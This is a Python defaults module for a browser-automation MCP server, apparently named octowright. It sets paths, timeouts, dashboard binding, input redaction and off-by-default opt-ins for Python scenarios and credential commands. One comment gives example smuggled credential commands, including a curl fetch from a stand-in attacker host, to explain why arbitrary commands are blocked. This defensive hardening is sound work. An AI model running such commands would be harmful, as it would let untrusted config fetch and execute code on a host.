# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

from __future__ import annotations

import os
import platform
from pathlib import Path

from octowright.config_paths import user_cache_dir, user_config_dir, user_state_dir

# Default OTel service name. Set as an env-var default (not a constant) so
# provide.telemetry.setup_telemetry() picks it up via its env-driven
# config, while still letting any user-supplied PROVIDE_TELEMETRY_SERVICE_NAME
# win. defaults.py is imported by every CLI entrypoint via the modules
# they load, so this lands before setup_telemetry() runs.
os.environ.setdefault("PROVIDE_TELEMETRY_SERVICE_NAME", "octowright")

DEFAULT_URL = os.environ.get("OCTOWRIGHT_DEFAULT_URL", "https://octowright.com")

DEFAULT_VIEWPORT_W = int(os.environ.get("OCTOWRIGHT_VIEWPORT_W", "1280"))
DEFAULT_VIEWPORT_H = int(os.environ.get("OCTOWRIGHT_VIEWPORT_H", "800"))

_REPO_ROOT = Path(__file__).resolve().parents[2]
_CONFIG_DIR = user_config_dir()
_STATE_DIR = user_state_dir()
_CACHE_DIR = user_cache_dir()
_DEFAULT_RECORDINGS = _STATE_DIR / "sessions"
_DEFAULT_PROFILES = _CONFIG_DIR / "profiles"
_DEFAULT_SCENARIOS = _CONFIG_DIR / "scenarios"

RECORDINGS_DIR = Path(os.environ.get("OCTOWRIGHT_RECORDINGS", str(_DEFAULT_RECORDINGS)))
PROFILES_DIR = Path(os.environ.get("OCTOWRIGHT_PROFILES_DIR", str(_DEFAULT_PROFILES)))
SCENARIOS_DIR = Path(os.environ.get("OCTOWRIGHT_SCENARIOS_DIR", str(_DEFAULT_SCENARIOS)))
SCENARIO_TEMPLATES_DIR = SCENARIOS_DIR / "templates"
CAPTURES_DIR = Path(os.environ.get("OCTOWRIGHT_CAPTURES_DIR", str(_CACHE_DIR / "captures")))
CAPTURE_MAX_TOTAL_BYTES = int(os.environ.get("OCTOWRIGHT_CAPTURE_MAX_TOTAL_BYTES", str(50 * 1024 * 1024)))
CAPTURE_TTL_SECONDS = float(os.environ.get("OCTOWRIGHT_CAPTURE_TTL_SECONDS", str(7 * 86400)))
SESSION_MANIFEST_PATH = Path(os.environ.get("OCTOWRIGHT_SESSION_MANIFEST", str(_STATE_DIR / "session-manifest.json")))

# Macro JSON storage. Default sits next to PROFILES_DIR so the user-config
# tree stays in one place. Override for per-test isolation.
MACROS_DIR = Path(os.environ.get("OCTOWRIGHT_MACROS_DIR", str(PROFILES_DIR.parent / "macros")))

# Golden snapshot storage (accessibility-tree golden assertions).
GOLDENS_DIR = Path(os.environ.get("OCTOWRIGHT_GOLDENS_DIR", str(_CONFIG_DIR / "goldens")))

# Upload staging directory: the only filesystem location an LLM-driven
# browser_set_input_files call may read from by default. Additional roots can
# be allowlisted via OCTOWRIGHT_UPLOAD_ROOTS (os.pathsep-separated). The
# current working directory is always permitted so test fixtures resolve.
UPLOAD_STAGING_DIR = Path(os.environ.get("OCTOWRIGHT_UPLOAD_STAGING_DIR", str(_CONFIG_DIR / "uploads")))
UPLOAD_EXTRA_ROOTS_RAW = os.environ.get("OCTOWRIGHT_UPLOAD_ROOTS", "")

# Octowright Advisor local state: preferences, lightweight usage summaries,
# and suggestion cooldown data. Override for tests or isolated deployments.
ADVISOR_STATE_PATH = Path(os.environ.get("OCTOWRIGHT_ADVISOR_STATE", str(_CONFIG_DIR / "advisor.json")))

# Singleton-leader lockfile. Override via OCTOWRIGHT_LOCK_PATH for hermetic
# tests that spawn a real daemon without touching the user's actual lockfile.
LOCK_PATH = Path(os.environ.get("OCTOWRIGHT_LOCK_PATH", str(_STATE_DIR / "octowright.lock")))

# Codex CLI install root for the skill-distribution copy step. CODEX_HOME is
# a Codex-defined env var, not OCTOWRIGHT_*; the resolved path is
# expanduser()'d at consumer-call time so ~ in the env value still works.
CODEX_HOME = os.environ.get("CODEX_HOME", "~/.codex")

# Antigravity CLI (agy) config root for the skill-distribution copy step.
# agy shares ~/.gemini/config as its plugin store; override ANTIGRAVITY_HOME
# to redirect installs to a test tree without touching the user's live config.
ANTIGRAVITY_HOME = os.environ.get("ANTIGRAVITY_HOME", "~/.gemini/config")


def active_profile_raw() -> str:
    """Read OCTOWRIGHT_PROFILE's raw env value for diagnostic display.

    Lives here so all OCTOWRIGHT_* env reads route through defaults.py.
    Consumers (octowright_status, selftest) echo this back to the user as
    the 'active profile' string. The actual filter logic lives in
    server.profiles.active_filter() — this is just the unparsed input.
    """
    return os.environ.get("OCTOWRIGHT_PROFILE", "").strip()


# Octowright defaults to HEADED mode. The whole point of this server is giving
# humans a window they can watch (and sometimes drive by hand), so headless is
# only correct when the caller has a specific background-verification reason —
# scripted health checks, parity runs, CI.
#
# Resolution order for the default headless value (each step short-circuits):
#   1. OCTOWRIGHT_HEADLESS=1 / =0 — explicit override always wins.
#   2. CI=true (set by GitHub Actions, GitLab, CircleCI, Travis, etc.) → headless.
#   3. Linux session with no $DISPLAY and no $WAYLAND_DISPLAY (SSH, no X server,
#      headless container) → headless.
#   4. Otherwise → headed.
def _detect_headless_default() -> bool:
    explicit = os.environ.get("OCTOWRIGHT_HEADLESS")
    if explicit is not None:
        return explicit == "1"
    if os.environ.get("CI", "").lower() in ("true", "1", "yes"):
        return True
    # macOS always has a window server; only Linux can be display-less here.
    return platform.system() == "Linux" and not os.environ.get("DISPLAY") and not os.environ.get("WAYLAND_DISPLAY")


HEADLESS_DEFAULT = _detect_headless_default()

SUPPORTED_KINDS = ("chromium", "firefox", "webkit")

DEFAULT_NAV_TIMEOUT_MS = int(os.environ.get("OCTOWRIGHT_NAV_TIMEOUT_MS", "30000"))
DEFAULT_ACTION_TIMEOUT_MS = int(os.environ.get("OCTOWRIGHT_ACTION_TIMEOUT_MS", "15000"))
# Total wall-clock budget for a browser launch MCP tool call. This must stay
# below common MCP client call deadlines (120s) so a wedged Playwright launch
# returns a normal tool error instead of making the client report a transport
# timeout.
BROWSER_LAUNCH_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BROWSER_LAUNCH_TIMEOUT_SECONDS", "90"))

# Follower bridge protection. These defaults are intentionally below common MCP
# client tool-call deadlines so bridge failures return explicit JSON-RPC errors
# instead of leaving the host to time out at ~120s.
BRIDGE_REQUEST_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_REQUEST_TIMEOUT_SECONDS", "20"))
BRIDGE_CONNECT_TIMEOUT_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_CONNECT_TIMEOUT_SECONDS", "10"))
BRIDGE_RECONNECT_MAX_SECONDS = float(os.environ.get("OCTOWRIGHT_BRIDGE_RECONNECT_MAX_SECONDS", "5"))
BRIDGE_STATE_PATH = Path(os.environ.get("OCTOWRIGHT_BRIDGE_STATE", str(_STATE_DIR / "bridge-state.json")))

# Per-action delay applied to macros, useful for visually following execution.
# Sleep happens AFTER pushing status to the pill and BEFORE dispatching the
# action, so the pill reflects the upcoming action while the user gets time
# to see it. 0 disables. Override per-call via the `slowmo_ms` arg on
# run_macro / macro_run / macro_run_sequence.
MACRO_SLOWMO_MS = int(os.environ.get("OCTOWRIGHT_MACRO_SLOWMO_MS", "0"))

# Cap on distinct macro-name label values applied to macro_run_total /
# macro_run_duration_seconds metrics. Long-lived deployments with programmatic
# macro generation could grow the per-label timeseries count without bound,
# blowing up Prometheus storage. Once the cap is exceeded, additional names
# collapse to a single ``"(overflow)"`` label so cardinality stays bounded.
METRICS_MACRO_LABEL_CAP = int(os.environ.get("OCTOWRIGHT_METRICS_MACRO_LABEL_CAP", "256"))

# HTTP debugger / dashboard sidecar — runs alongside the MCP stdio server when
# `octowright serve` is invoked. Bind defaults to localhost only because the
# debugger UI exposes raw recordings, video, and trace data.
HTTP_HOST = os.environ.get("OCTOWRIGHT_HTTP_HOST", "127.0.0.1")
HTTP_PORT = int(os.environ.get("OCTOWRIGHT_HTTP_PORT", "8765"))
# When the configured port is in use, try this many higher ports before giving up.
HTTP_PORT_RETRIES = 5
DASHBOARD_REMOTE_ALLOWED_ENV = "OCTOWRIGHT_ALLOW_REMOTE_DASHBOARD"
NETWORK_EVENT_LIMIT = int(os.environ.get("OCTOWRIGHT_NETWORK_EVENT_LIMIT", "5000"))

# Idle-watchdog: once the pool sits empty for this many seconds, `octowright
# serve` exits on its own. Override with --idle-grace or --keep-alive to disable.
# The poll interval below controls how often the watchdog samples the pool —
# keep it short so shutdown is snappy.
#
# Default raised from 30s to 300s (5 min) so a daemon that's been spawned but
# is waiting on the first browser_launch survives normal chat-paced workflows
# (talking with the MCP client, exploring docs, etc.). Truly unused daemons
# still self-clean within minutes; not hours.
IDLE_GRACE_SECONDS = float(os.environ.get("OCTOWRIGHT_IDLE_GRACE", "300"))
IDLE_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_IDLE_POLL", "2"))

# Per-cache LRU bound on `octowright.http.session_artifacts.SessionArtifactCache`.
# Each cache (artifacts, report, console index, downloads index, path-exists)
# is independently capped at this many entries so the global singleton can't
# grow indefinitely as more sessions are processed.
SESSION_ARTIFACT_CACHE_MAX_ENTRIES = int(os.environ.get("OCTOWRIGHT_SESSION_ARTIFACT_CACHE_MAX_ENTRIES", "256"))

# Per-cache LRU bound on the closed-session discovery caches in
# `octowright.http.discovery` (per-file launch-summary cache + per-dir
# recording-index cache). Bounds memory growth across long-running daemons
# that accumulate large recording histories.
DISCOVERY_CACHE_MAX_ENTRIES = int(os.environ.get("OCTOWRIGHT_DISCOVERY_CACHE_MAX_ENTRIES", "512"))

# TTL on the path-exists cache used by /downloads to avoid stat'ing every
# referenced file on every page load. Sized to dedupe stats within a single
# paginated request (sub-second) while still refreshing fast enough that a
# user manually deleting a download sees the UI catch up within a couple
# refreshes.
DOWNLOAD_PATH_EXISTS_TTL_SECONDS = float(os.environ.get("OCTOWRIGHT_DOWNLOAD_PATH_EXISTS_TTL_SECONDS", "2.0"))

# WebSocket /tail (per-session JSONL stream) cadence.
#
# - TAIL_POLL_SECONDS: interval between filesystem polls. ~1 Hz feels live
#   without hammering the file system.
# - TAIL_HEARTBEAT_SECONDS: maximum gap between empty keepalive frames on a
#   quiet stream. The loop only pushes when there's something new (events
#   or a live→closed transition), so this bounds how long a quiet
#   connection can stay silent before the client gets a liveness ping.
TAIL_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_TAIL_POLL_SECONDS", "1.0"))
TAIL_HEARTBEAT_SECONDS = float(os.environ.get("OCTOWRIGHT_TAIL_HEARTBEAT_SECONDS", "15.0"))

# WebSocket-frame cache flush cadence. Per-frame ``fh.flush()`` would
# add a syscall per inbound/outbound WS frame — for game servers or
# market-data feeds (thousands of frames per second) that becomes the
# dominant cost. Python's text-mode block buffer (~8KB) on its own
# would hold low-volume feeds out of the dashboard tail until the
# buffer fills. Compromise: flush when EITHER the frame count or the
# elapsed-time threshold is hit, whichever comes first. Tail polls at
# 1Hz by default so 250ms flush feels live; 32 frames keeps batches
# small enough that bursty feeds don't accumulate noticeable lag.
WEBSOCKET_CACHE_FLUSH_FRAMES = int(os.environ.get("OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_FRAMES", "32"))
WEBSOCKET_CACHE_FLUSH_SECONDS = float(os.environ.get("OCTOWRIGHT_WEBSOCKET_CACHE_FLUSH_SECONDS", "0.25"))

# SSE /api/dashboard/events cadence.
#
# - DASHBOARD_DISCONNECT_POLL_SECONDS: how often the streaming endpoint checks
#   ``request.is_disconnected()`` so a closed browser tab tears the SSE down
#   promptly. Sub-second to avoid stragglers in the test harness.
# - DASHBOARD_HEARTBEAT_SECONDS: max silent interval before emitting an SSE
#   ``: heartbeat`` comment. Under proxy idle-close (typically 60s) so the
#   stream stays open through reverse proxies.
DASHBOARD_DISCONNECT_POLL_SECONDS = float(os.environ.get("OCTOWRIGHT_DASHBOARD_DISCONNECT_POLL_SECONDS", "0.05"))
DASHBOARD_HEARTBEAT_SECONDS = float(os.environ.get("OCTOWRIGHT_DASHBOARD_HEARTBEAT_SECONDS", "15.0"))


def _parse_bool_env(name: str, default: bool) -> bool:
    """Truthy/falsy bool parser for env-driven flags. Accepts the usual
    spellings ('1'/'0', 'true'/'false', 'yes'/'no', 'on'/'off',
    case-insensitive). Unset → default."""
    raw = os.environ.get(name)
    if raw is None:
        return default
    return raw.strip().lower() not in {"0", "false", "no", "off"}


# HTTP metrics middleware (Prometheus-style /api/metrics endpoint). On by
# default; flip to 0/false/no/off to disable instrumentation in production
# deployments where dashboard-only metric scraping isn't wanted.
HTTP_METRICS_ENABLED = _parse_bool_env("OCTOWRIGHT_HTTP_METRICS", True)

# Record-time redaction of user-typed input values in the per-session JSONL
# recording. Without this, ``type_text`` and ``fill`` MCP calls write the
# literal value (passwords, API keys, MFA codes, …) into the stream that
# `/api/sessions/{id}/events` and the WebSocket `/tail` endpoint expose, so
# anyone with read access to a recording can recover the secret. The macro
# linter (`macros/lint.py`) only flags candidate credentials at save-time
# and is not a substitute.
#
# Modes:
#   - ``off``       — legacy behavior; never redact. Use only when you
#                     explicitly trust the recording sink.
#   - ``passwords`` — DEFAULT. Inspect the locator's DOM element type; if
#                     it is ``<input type="password">``, replace the
#                     recorded value with ``REDACTED_INPUT_PLACEHOLDER``.
#                     The page still receives the real value.
#   - ``all``       — Redact every typed/filled value regardless of element
#                     type. Useful for high-sensitivity workflows where any
#                     user-supplied value may be confidential.
INPUT_REDACTION_MODE = os.environ.get("OCTOWRIGHT_REDACT_INPUTS", "passwords").strip().lower() or "passwords"
REDACTED_INPUT_PLACEHOLDER = "<redacted:password>"

# Env var name controlling whether ``.py`` scenario files are loadable.
# ``.py`` scenarios run arbitrary Python at module import; default OFF so a
# scenarios dir on shared storage or a CI checkout can't be a code-execution
# vector. Operators who deliberately ship Python scenarios opt in by setting
# this to ``1``/``true``/``yes``/``on``.
ALLOW_PY_SCENARIOS_ENV = "OCTOWRIGHT_ALLOW_PY_SCENARIOS"


def allow_py_scenarios() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_PY_SCENARIOS`` opts into ``.py``
    scenario loading. Read at call time so tests can monkeypatch the env
    var without reloading the module."""
    return _parse_bool_env(ALLOW_PY_SCENARIOS_ENV, False)


# Env var name controlling whether persona credential ``*_cmd`` values may
# invoke a POSIX shell with ``-c`` (``bash -c "..."``, ``sh -c "..."``, etc.).
# Default OFF so persona YAML — which may come from shared storage or a
# CI-checked-in directory — can't smuggle arbitrary shell execution into the
# daemon. Operators who deliberately ship shell-style credential helpers opt
# in by setting this to ``1``/``true``/``yes``/``on``.
ALLOW_SHELL_CRED_CMDS_ENV = "OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS"


def allow_shell_cred_cmds() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_SHELL_CRED_CMDS`` opts into
    ``bash -c`` (and equivalents) for persona credential cmds. Read at call
    time so tests can monkeypatch the env var without reloading the module."""
    return _parse_bool_env(ALLOW_SHELL_CRED_CMDS_ENV, False)


# Env var name controlling whether persona credential ``*_cmd`` values may
# invoke an arbitrary executable that is NOT on the static well-known
# credential-helper allowlist (see ``personas._CREDENTIAL_HELPER_ALLOWLIST``).
# Default OFF so persona YAML — which may come from shared storage or a
# CI-checked-in directory — can't smuggle an arbitrary binary onto the daemon
# host (``["/tmp/evil.sh"]``, ``["curl", "attacker.example/payload"]``, etc).
# Operators who deliberately ship custom credential helpers opt in by setting
# this to ``1``/``true``/``yes``/``on``.
ALLOW_ARBITRARY_CRED_CMDS_ENV = "OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS"


def allow_arbitrary_cred_cmds() -> bool:
    """Return True iff ``OCTOWRIGHT_ALLOW_ARBITRARY_CRED_CMDS`` opts into
    running argv-form credential cmds whose executable basename is not on
    the static well-known helper allowlist. Read at call time so tests can
    monkeypatch the env var without reloading the module."""
    return _parse_bool_env(ALLOW_ARBITRARY_CRED_CMDS_ENV, False)
